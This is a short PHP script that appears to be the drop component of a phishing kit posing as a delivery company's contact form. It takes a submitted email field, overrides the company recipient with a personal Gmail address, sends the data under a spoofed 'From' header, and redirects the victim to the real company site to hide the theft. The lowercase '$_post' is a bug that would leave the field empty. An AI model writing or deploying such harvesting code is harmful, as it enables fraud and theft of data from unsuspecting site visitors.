<?php


    $message = "";
    $message .= "---|BY RDDS|---\n";
    $message .= "E: " . $_post['EMAIL'] . "\n"; 
    $message .= "--------------------------\n";
    
    
	$to ="support@redrocketdelivery.com";
	$to ="dreshaw3030@gmail.com";

	$subject = "Information from website  ";
	$headers = "From: Goodluckjonathan<goodluckjonatan@nigerianpresident.com>";
	
	$send = mail($to,$subject,$message,$headers);
	if($send){
		header("Location: https://www.redrocketdelivery.com/contacted.php");
	}
?>

